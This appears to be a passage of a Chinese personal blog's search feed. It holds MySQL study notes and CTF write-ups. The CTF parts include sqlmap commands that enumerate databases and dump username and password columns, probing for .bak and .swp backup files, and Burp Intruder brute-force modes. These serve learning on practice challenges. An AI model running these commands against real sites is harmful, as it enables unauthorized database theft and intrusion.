null非空，指定某列不为空（注意区分空和空格的关系）</li><li>unique：唯一约束，指定某列和几列组合的数据不能重复</li><li>primary key:主键约束，指定某列的数据不能重复，唯一</li><li>foreign key:外键，指定该列记录属于主表中的一条记录，参照另一条记录</li><li>check：检查，指定一个表达式，用于检验指定数据</li></ol><h3 id="primary-key-not-null-unique"><a href="#primary-key-not-null-unique" class="headerlink" title="primary key = not null + unique"></a>primary key = not null + unique</h3><ol><li>主键是用来唯一标识表中的每一行，类型一般为整型或者字符串</li><li>具有主键约束的列不允许有null值，不允许有重复值</li><li>每个表最多只允许一个主键，可定义联合主键，主键名总是PRIMARY</li></ol><h4 id="联合主键"><a href="#联合主键" class="headerlink" title="联合主键"></a>联合主键</h4><ol><li>用几个列来进行唯一标识一行<pre><code> constraint pk_id_name primary_key(id,name)</code></pre></li><li>constraint可以给键进行重命名，但是在数据字典中，主键名还是显示primary</li></ol><h3 id="foreign-key外键约束"><a href="#foreign-key外键约束" class="headerlink" title="foreign key外键约束"></a>foreign key外键约束</h3><ol><li>参照完整性约束，保证一个或两个表之间的参照完整性，外键是构建于一个表的两个字段或者是两个表的两个字段之间的参照关系<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4></li><li>具有外键约束的列的值不能随便给，必须满足外键所引用的主键的取值</li><li>一张表中可以定义多个外键</li><li>外键列默认可以给null值<h3 id="父子表"><a href="#父子表" class="headerlink" title="父子表"></a>父子表</h3></li><li>外键所在的表叫做子表，从表</li><li>外键所引用的主键所在的表叫做父表，主表<pre><code> constraint emp_deptid_fk foreign_key(deptid) references dept(deptid)</code></pre><h4 id="外键的删除规则"><a href="#外键的删除规则" class="headerlink" title="外键的删除规则"></a>外键的删除规则</h4></li><li>当删除父表中的行时，如果子表中有依赖被删除的父行的子行存在，那么就不允许删除，并抛出异常（默认对外键使用on delete restrict或on delete no action选项）</li><li>在定义外键约束时，可以通过使用on delete cascade或on delete set null来改变外加的默认删除规则</li><li>on delete cascade：级联删除，当删除父表中的行时，如果子表中有依赖于被删除父行的子行存在，那么联通子行一起删除，相当于rm -f</li><li>on delete set null：当删除父表中的行时，如果子表中有依赖于被删除的父行的子行存在，那么不删除，而是将子行的外键设置为null<h4 id="外键引用定义"><a href="#外键引用定义" class="headerlink" title="外键引用定义"></a>外键引用定义</h4><pre><code> reference_definition:     REFERENCES tbl_name (index_col_name,...)     [MATCH FULL | MATCH PARTIAL | MATCH SIMPLE]     [ON DELETE reference_option]     [ON UPDATE reference_option] reference_option:     RESTRICT | CASCADE | SET NULL | NO ACTION</code></pre></li></ol><h3 id="check约束"><a href="#check约束" class="headerlink" title="check约束"></a>check约束</h3><ol><li><p>MySQl中可以使用check约束，但是check约束对数据验证没有任何作用。</p></li><li><p>Oracle中国可以使用check约束，有相应作用</p><pre><code> mysql&gt; create table test_ck(     -&gt;   id int check(id&gt;0)     -&gt; ); mysql&gt; insert into test_ck values(-100); mysql&gt; select * from test_ck; +------+ | id   | +------+ | -100 | +------+</code></pre></li><li><p>也可以使用ENUM和set来变通地实现check约束，ENUM只能选一个值，SET可以选择多个值</p></li></ol><h3 id="AUTO-INCREMENT"><a href="#AUTO-INCREMENT" class="headerlink" title="AUTO_INCREMENT"></a>AUTO_INCREMENT</h3><ol><li>自增</li><li>缺点：当删除上一条时会在删除的上一条的基础上加1，不会覆盖原来删除的编号</li><li>列的数值自动增长，列的类型只能是整数类型</li><li>通常给主键添加自增长约束</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql中的所有引擎</title>
      <link href="/mysql%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%BC%95%E6%93%8E/"/>
      <url>/mysql%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql中所有的引擎"><a href="#mysql中所有的引擎" class="headerlink" title="mysql中所有的引擎"></a>mysql中所有的引擎</h1><h2 id="innoDB"><a href="#innoDB" class="headerlink" title="innoDB:"></a>innoDB:</h2><ol><li>innoDB存储文件有两个，后缀分别为.frm和.idb，其中.frm是表的定义文件，而.idb是数据文件</li><li>innoDB中存在表锁和行锁，行锁是在命中索引的情况下才会起作用</li></ol><h2 id="Myisam"><a href="#Myisam" class="headerlink" title="Myisam"></a>Myisam</h2><ol><li>存储文件有三个，后缀分别为.frm,.MYD和.MYI，其中.frm是表的定义文件，.MYD是数据文件，.MYI是索引文件</li><li>Myisam只支持表锁，且不支持事务，Myisam由于有单独的索引文件，在读取数据方面的性能很高</li><li>存储结构:innoDB和Myisam都是用B+Tree来存储数据的</li></ol><h1 id="mysql的索引"><a href="#mysql的索引" class="headerlink" title="mysql的索引"></a>mysql的索引</h1><ol><li>索引是一种用来实现MySQL高效获取数据的数据结构</li><li>在某个字段上建立索引，意思就是让mysql对该字段以索引这种数据结构来存储，然后查找的时候就有对应的查找算法</li><li>每种查找算法都只能应用于特定的数据结构之上：顺序查找以来于顺序结构，折半查找通过二叉寻找树或者红黑树实现二分搜索，在数据之外，数据库还维持着满足特定查找算法的数据结构，这种数据结构就是索引</li></ol><h1 id="MySQL的B-Tree"><a href="#MySQL的B-Tree" class="headerlink" title="MySQL的B+Tree"></a>MySQL的B+Tree</h1><ol><li>目前大多数的数据库系统和文件系统都采用B-Tree或其变种B+Tree作为索引结构</li><li>B+树索引是B+树在数据库中的一种实现，B+树中的B表示平衡，而不是二叉</li></ol><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://blog.csdn.net/ws1296931325/article/details/86657346">https://blog.csdn.net/ws1296931325/article/details/86657346</a></li><li>如有侵权，请联系我删除，谢谢</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql workbench table加check约束</title>
      <link href="/mysql%E5%8A%A0check%E7%BA%A6%E6%9D%9F/"/>
      <url>/mysql%E5%8A%A0check%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="加check约束"><a href="#加check约束" class="headerlink" title="加check约束"></a>加check约束</h1><ol><li>选择Datatype类，下拉选择ENUM(‘男’，’女’)</li><li>即为枚举类型，加check约束后的，仅限于男和女两种数据的约束</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql约束</title>
      <link href="/create%20tables%E9%80%89%E9%A1%B9/"/>
      <url>/create%20tables%E9%80%89%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="create-tables选项"><a href="#create-tables选项" class="headerlink" title="create tables选项"></a>create tables选项</h1><h2 id="定义列的时候，指定列选项"><a href="#定义列的时候，指定列选项" class="headerlink" title="定义列的时候，指定列选项"></a>定义列的时候，指定列选项</h2><h2 id="约束的概念"><a href="#约束的概念" class="headerlink" title="约束的概念"></a>约束的概念</h2><ol><li>对表中的数据进行限定，保证数据的正确性。有效性和完整性<h3 id="DEFAULT-定义列的默认值"><a href="#DEFAULT-定义列的默认值" class="headerlink" title="DEFAULT 定义列的默认值"></a>DEFAULT 定义列的默认值</h3></li><li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值，如果没有为null</li><li>sex char(1) default ‘m’</li></ol><h3 id="COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中"><a href="#COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中" class="headerlink" title="COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中"></a>COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中</h3><ol><li>创建带有列注释的表stu_comment<br>create table stu_comment(<br> id int not null primary key,<br> comment ‘学号’<br> name varchar(20) not null,<br> comment ‘姓名’<br>);<h4 id="从数据字典查询注释信息"><a href="#从数据字典查询注释信息" class="headerlink" title="从数据字典查询注释信息"></a>从数据字典查询注释信息</h4></li><li>select comumn_name,column_comment</li><li>from information_schema.columns</li><li>where table_name=’stu_comment’</li></ol><h1 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" title="常见的约束类型"></a>常见的约束类型</h1><ol><li>not null 非空类型，指定某列不为空</li><li>unique 唯一约束，指定某列和几列组合的数据不能重复</li><li>primary key 主键约束，指定某列的数据不能重复</li><li>foreign key 外键,指定该列记录属于主表中的一条记录，参照另一条数据</li><li>check 检查，指定一个表达式，用于检验指定数据</li></ol><p>CREATE TABLE table_name(<br>    column_name datetype [not null] [unique key] [primary key] [check(expr)]<br>);</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>foreign key用法详解</title>
      <link href="/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
      <url>/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="foreign-key用法详解"><a href="#foreign-key用法详解" class="headerlink" title="foreign key用法详解"></a>foreign key用法详解</h1><h2 id="引子：把所有数据都存放于一张表的弊端"><a href="#引子：把所有数据都存放于一张表的弊端" class="headerlink" title="引子：把所有数据都存放于一张表的弊端"></a>引子：把所有数据都存放于一张表的弊端</h2><ol><li>组织结构复杂比清晰</li><li>浪费空间</li><li>拓展性差</li></ol><h2 id="表和表之间存在的三种关系"><a href="#表和表之间存在的三种关系" class="headerlink" title="表和表之间存在的三种关系"></a>表和表之间存在的三种关系</h2><ol><li>一对多</li><li>多对多</li><li>一对一</li></ol><h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><ol><li>先站在表emp的角度</li><li>去找表emp的多条记录能否对应表dep的一条记录。</li><li>翻译2的意义：</li><li>左表emp的多条记录==》多个员工</li><li>右表dep的一条记录==》一个部门</li><li>最终翻译结果：多个员工是否可以属于一个部门？</li><li>如果是则需要进行part2的流程</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip伪加密</title>
      <link href="/%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/"/>
      <url>/%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="参考博客地址"><a href="#参考博客地址" class="headerlink" title="参考博客地址"></a>参考博客地址</h1><ol><li><a href="https://www.cnblogs.com/cute-puli/p/16042101.html">https://www.cnblogs.com/cute-puli/p/16042101.html</a></li></ol><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><h2 id="010或者winhex"><a href="#010或者winhex" class="headerlink" title="010或者winhex"></a>010或者winhex</h2><ol><li>建议使用010editor</li><li>因为可以自动区分数据区，目录区和目录结束标志<h3 id="zip文件组成"><a href="#zip文件组成" class="headerlink" title="zip文件组成"></a>zip文件组成</h3></li><li>压缩源文件数据区</li><li>压缩源文件目录区</li><li>压缩源文件目录结束标志</li></ol><h1 id="奇数为加密，偶数为不加密"><a href="#奇数为加密，偶数为不加密" class="headerlink" title="奇数为加密，偶数为不加密"></a>奇数为加密，偶数为不加密</h1><h1 id="无加密："><a href="#无加密：" class="headerlink" title="无加密："></a>无加密：</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录区的全局方式位标记应为00 00</li></ol><h1 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录区的全局加密方式应为 00 90</li></ol><h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><ol><li>压缩源文件数据区的全局加密应为00 00</li><li>压缩源文件目录去的全局方式应为00 90</li></ol><p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</p><p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><p>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> zip伪加密 </category>
          
          <category> 文件修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 文件修复 </tag>
            
            <tag> zip伪加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息泄露</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h1 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h1><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><h2 id="bak文件下载"><a href="#bak文件下载" class="headerlink" title="bak文件下载"></a>bak文件下载</h2><ol><li>访问目录下的bak文件</li><li>题目提示source 在index.php下，所以用hackbar访问index.php.bak</li><li>将bak文件后缀改为txt或者用notepad++打开即可获得flag</li></ol><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><ol><li>vim会自动生成备份文件和临时文件</li><li>临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除</li><li>如果意外退出则会保留，名为.filename.swp</li><li>第一次产生的交换文件名为“.filename.txt.swp”；再次意外退出后，将会产生名为“.filename.txt.swo”的交换文件；而第三次产生的交换文件则为“.filename.txt.swn</li><li>因为这里已经告诉我们是index.php了，所以其意外退出而保留的临时文件是 .index.php.swp</li></ol><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><ol><li>直接打开页面发现是phpinfo界面</li><li>思路是从表中搜索flag的信息</li><li>浏览器中ctrl+f查找（和wires hark相同）flag</li></ol><h1 id="信息泄露问题"><a href="#信息泄露问题" class="headerlink" title="信息泄露问题"></a>信息泄露问题</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><ol><li>用菜刀爬或者用御剑字典爆破搜就完了</li><li><a href="https://imgtu.com/i/H2keX9"><img src="https://s4.ax1x.com/2022/02/15/H2keX9.md.png" alt="H2keX9.md.png"></a></li><li>观察之间的不同</li><li>一开始我还以为c=d o=a之类的是将下部的challenge那一串替换，结果发现我想多了</li><li>里面有flag_in_here.txt，双击打开后发现了flag</li><li><a href="https://imgtu.com/i/H2AV4f"><img src="https://s4.ax1x.com/2022/02/15/H2AV4f.md.png" alt="H2AV4f.md.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息泄露 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春季训练赛</title>
      <link href="/2022%E6%98%A5%E5%AD%A3%E8%AE%AD%E7%BB%83%E8%B5%9B/"/>
      <url>/2022%E6%98%A5%E5%AD%A3%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2022春季训练赛"><a href="#2022春季训练赛" class="headerlink" title="2022春季训练赛"></a>2022春季训练赛</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到："><a href="#签到：" class="headerlink" title="签到："></a>签到：</h3><ol><li>010editor打开发现PK开头，知道是一个zip压缩包</li><li>更改后缀为.zip，解压打开发现flag</li></ol><h3 id="签到：-1"><a href="#签到：-1" class="headerlink" title="签到："></a>签到：</h3><ol><li>BASE85{6:”O=1GX;K8jQKJ;G(“;DhKL9h)S6;BsD:IJ&gt;[;HHmd9h[rJ1c/0%&lt;(g@i6&lt;6QU&lt;\d]P7RpNU:eETA&lt;BWK.4ZtrV}</li><li>BASE85解一层出base35</li><li><a href="https://imgtu.com/i/qwIiNQ"><img src="https://s1.ax1x.com/2022/03/27/qwIiNQ.png" alt="qwIiNQ.png"></a></li><li>再解一层给出微信id</li><li><a href="https://imgtu.com/i/qwIE3n"><img src="https://s1.ax1x.com/2022/03/27/qwIE3n.png" alt="qwIE3n.png"></a></li><li>微信加好友有备注即可获得flag</li></ol><h3 id="黑化的维亚"><a href="#黑化的维亚" class="headerlink" title="黑化的维亚"></a>黑化的维亚</h3><ol><li>用stegsolve打开，查看不同色域下的图片</li><li><a href="https://imgtu.com/i/qwIgDf"><img src="https://s1.ax1x.com/2022/03/27/qwIgDf.png" alt="qwIgDf.png"></a></li><li>找到flag的上一级（我一开始还以为这就是flag，提交不对）</li><li>后面看到!123和fkvd这么不规则但是又像flag的</li><li>后面尝试偏移量为0，1，2，3的栅栏密码，即可解得flag</li></ol><h3 id="0和1的故事"><a href="#0和1的故事" class="headerlink" title="0和1的故事"></a>0和1的故事</h3><ol><li>解压后里面有一个txt文件，打开后看最后发现有==，知道是base64解码</li><li><a href="https://imgtu.com/i/qwb2tO"><img src="https://s1.ax1x.com/2022/03/27/qwb2tO.png" alt="qwb2tO.png"></a></li><li>解码网站<a href="https://the-x.cn/base64/">https://the-x.cn/base64/</a></li><li>解码后发现里面有一个png文件，图片中全是01字符</li><li><a href="https://imgtu.com/i/qwbonI"><img src="https://s1.ax1x.com/2022/03/27/qwbonI.png" alt="qwbonI.png"></a></li><li>两种选择，一种是利用手机去扫描出文本，第二种是在linux环境下cat出01字符串</li><li>得到01字符一开始还以为是一个二进制文件或者是培根密码，然后我五位一解，（解出来的都是什么东西。。。）（培根密码是0为a，1为b，依此得出不同字符）</li><li>长和宽相同的情况下猜测是二维码，但是上学期学的py都被时间冲刷干净了，我就在网上找脚本，但是找到的因为MAXN设定的不同，无法得到正确的二维码（轻易改动数据，也会出现数组越界的segementation fault的问题）</li><li>后面用excel表格去做，将1所在的单元格填充为黑色，0所在的单元格填充为白色（可能出现的绿色不会影响二维码扫描）</li><li><a href="https://imgtu.com/i/qwbbAf"><img src="https://s1.ax1x.com/2022/03/27/qwbbAf.png" alt="qwbbAf.png"></a></li><li>扫描后即可得到flag{Stories_of_0_and_1}</li></ol><h2 id="web题"><a href="#web题" class="headerlink" title="web题"></a>web题</h2><h3 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h3><ol><li>上来一看什么也没有，就猜测是哪几种题型（反正不可能上来就是sql注入文件上传之类的，没有地方注入东西）</li><li>用御剑字典爆破后缀或者用spider去爬，发现有一个txt为后缀的，打开网页得到4ll.html</li><li>我一开始还以为是411，结果404就搁置了好久，最后有hint发布，“411和4ll真的能分清吗”，在hackbar中打开，给后缀，excute后给出I have tell you all的字符,还是没有什么东西</li><li>ctrl + u查看源代码发现flag</li><li>这里由于没有保留截图，也没有环境，暂无截图</li></ol><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><ol><li>我不知道给的那个hint是什么意思。。。</li><li>强大的工具一把梭，我sqlmap跑了好久都没有</li><li>这里浅谈一下我的思路吧</li><li>两个登录框，分别给出1，1，用burp抓包，发现是post包，post注入</li><li><a href="https://imgtu.com/i/qwLEIf"><img src="https://s1.ax1x.com/2022/03/27/qwLEIf.png" alt="qwLEIf.png"></a></li><li><a href="https://imgtu.com/i/qwLJiT"><img src="https://s1.ax1x.com/2022/03/27/qwLJiT.png" alt="qwLJiT.png"></a></li><li>sqlmap post注入的命令分别是：</li><li>sqlmap -r “admin.txt” –dbs (–level n)(默认为level 1)</li><li>sqlmap -r “admin.txt” -D xxx –tables</li><li>sqlmap -r “admin.txt” -D xxx -T xxx –columns</li><li>sqlmap -r “admin.txt” -D xxx –T xxx -C xxx –dump</li></ol><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><ol><li>猪圈+银河骑士+圣殿+栅栏</li><li><a href="https://imgtu.com/i/qwL7Y8"><img src="https://s1.ax1x.com/2022/03/27/qwL7Y8.png" alt="qwL7Y8.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit intruder的四种攻击方式</title>
      <link href="/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuit-intruder的四种攻击方式"><a href="#burpsuit-intruder的四种攻击方式" class="headerlink" title="burpsuit intruder的四种攻击方式"></a>burpsuit intruder的四种攻击方式</h1><h2 id="sniper狙击手模式"><a href="#sniper狙击手模式" class="headerlink" title="sniper狙击手模式"></a>sniper狙击手模式</h2><ol><li>使用一组payload集合，一次只使用一个payload位置<h2 id="battering-ram-攻城锤模式"><a href="#battering-ram-攻城锤模式" class="headerlink" title="battering ram 攻城锤模式"></a>battering ram 攻城锤模式</h2></li><li>只使用一个payload集合，每次攻击都是替换所有payload标记位置</li><li>与狙击手模式不同点在于狙击手每次只替换一个标记位置，而攻城锤替换所有的标记位置<h2 id="三Pitchfork（草叉模式）"><a href="#三Pitchfork（草叉模式）" class="headerlink" title="三Pitchfork（草叉模式）"></a>三Pitchfork（草叉模式）</h2><h2 id="四Cluster-bomb（集束炸弹模式）"><a href="#四Cluster-bomb（集束炸弹模式）" class="headerlink" title="四Cluster bomb（集束炸弹模式）"></a>四Cluster bomb（集束炸弹模式）</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h1><h2 id="判断是否能注入"><a href="#判断是否能注入" class="headerlink" title="判断是否能注入"></a>判断是否能注入</h2><ol><li>python sqlmap.py -u “url?id=1”<h2 id="找库"><a href="#找库" class="headerlink" title="找库"></a>找库</h2></li><li>python sqlmap.py -u “url?id=1” –dbs</li></ol><h2 id="找表"><a href="#找表" class="headerlink" title="找表"></a>找表</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 –tables</li></ol><h2 id="找列"><a href="#找列" class="headerlink" title="找列"></a>找列</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 –columns</li></ol><h2 id="dump掉信息"><a href="#dump掉信息" class="headerlink" title="dump掉信息"></a>dump掉信息</h2><ol><li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 -C 列名 –dump</li><li>或者列名前加–columns</li></ol><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://www.cnblogs.com/ichunqiu/p/5805108.html">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></li></ol><h1 id="嗅探等级："><a href="#嗅探等级：" class="headerlink" title="嗅探等级："></a>嗅探等级：</h1><h2 id="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"><a href="#不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢" class="headerlink" title="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"></a>不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢</h2><h2 id="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"><a href="#当不能确定哪个payload时或参数作为注入点，可以使用较高的level值" class="headerlink" title="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"></a>当不能确定哪个payload时或参数作为注入点，可以使用较高的level值</h2><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><ol><li>http cookie测试</li></ol><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><ol><li>http user-agent/referer头回测试</li></ol><h1 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h1><ol><li><a href="https://blog.csdn.net/a_small_rabbit/article/details/101110011">https://blog.csdn.net/a_small_rabbit/article/details/101110011</a></li></ol><h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><ol><li>用burp抓包</li><li>将抓到的包保存为.txt文件类型(右击，copy to file)</li><li>sqlmap中的命令：sqlmap -r “admin.txt” -p n –dbs(-r表示加载一个文件，-p指定参数)</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 –tables</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 –columns</li><li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 -C “username,password” –dump</li></ol><h2 id="指定参数（get传参来实现post注入）"><a href="#指定参数（get传参来实现post注入）" class="headerlink" title="指定参数（get传参来实现post注入）"></a>指定参数（get传参来实现post注入）</h2><ol><li>sqlmap -u “url” –data “n=1&amp;p=1” –dbs(与上面类似)</li><li>sqlmap -u “url” –data “username=1&amp;password=1” –dbs(假设参数是username和password)</li></ol><h2 id="r指定文件去暴库"><a href="#r指定文件去暴库" class="headerlink" title="-r指定文件去暴库"></a>-r指定文件去暴库</h2><ol><li>python sqlmap.py -r 文件路径+文件名.txt –dbs</li></ol><h2 id="forms"><a href="#forms" class="headerlink" title="-forms"></a>-forms</h2><ol><li>使用该命令，使sqlmap自己抓包</li><li>sqlmap -u “url” –forms –level=5 –dbs</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本小子 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 脚本小子 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub的默认口令</title>
      <link href="/ctfhub%E7%9A%84%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
      <url>/ctfhub%E7%9A%84%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfhub的默认口令"><a href="#ctfhub的默认口令" class="headerlink" title="ctfhub的默认口令"></a>ctfhub的默认口令</h1><ol><li><a href="https://imgtu.com/i/qZKhQ0"><img src="https://s1.ax1x.com/2022/03/20/qZKhQ0.png" alt="qZKhQ0.png"></a></li><li>三个登录框，一开始想用burp的intruder去爆破，或者绕过验证码</li><li>后来看wp知道给的eyou右键网关的意义是让我们去寻找默认口令</li></ol><h1 id="ctfhub的备份文件"><a href="#ctfhub的备份文件" class="headerlink" title="ctfhub的备份文件"></a>ctfhub的备份文件</h1><ol><li><a href="https://imgtu.com/i/qZbrGt"><img src="https://s1.ax1x.com/2022/03/20/qZbrGt.png" alt="qZbrGt.png"></a></li><li>给出常见的网站源码备份文件后缀和常见的网站源码备份文件名</li><li>一个一个组合起来试一试，发现<a href="http://www.zip是可行的,作为后缀可以给出一个zip文件/">www.zip是可行的，作为后缀可以给出一个zip文件</a></li><li>将爆出的txt文件的文件名作为后缀用hackbar打开，可以爆出flag</li><li><a href="https://imgtu.com/i/qZqEod"><img src="https://s1.ax1x.com/2022/03/20/qZqEod.png" alt="qZqEod.png"></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>adduser</title>
      <link href="/adduser/"/>
      <url>/adduser/</url>
      
